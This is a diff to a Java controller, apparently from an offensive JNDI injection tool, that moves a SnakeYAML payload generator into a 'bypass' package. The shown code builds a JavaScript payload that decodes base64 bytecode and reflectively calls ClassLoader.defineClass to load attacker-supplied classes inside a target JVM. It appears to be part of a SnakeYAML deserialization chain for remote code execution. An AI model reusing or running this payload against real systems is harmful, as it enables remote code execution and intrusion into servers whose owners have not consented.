@@ -1,10 +1,9 @@
-package map.jndi.controller;
+package map.jndi.controller.bypass;
 
 import map.jndi.Config;
-import map.jndi.Main;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
-import map.jndi.bean.ClassBean;
+import map.jndi.controller.BasicController;
 import map.jndi.server.WebServer;
 import map.jndi.template.ScriptEngineFactoryTemplate;
 import map.jndi.util.JarUtil;
@@ -22,11 +21,11 @@ import java.util.Base64;
 @JNDIMapping("/SnakeYaml")
 public class SnakeYamlController extends BasicController {
     @Override
-    public Object process(ClassBean classBean) {
+    public Object process(byte[] byteCode) {
         String factoryClassName = MiscUtil.getRandStr(12);
         String jarName = MiscUtil.getRandStr(12);
 
-        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(classBean.getData()) + "');" +
+        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
                 "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                 "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                 "method.setAccessible(true);" +
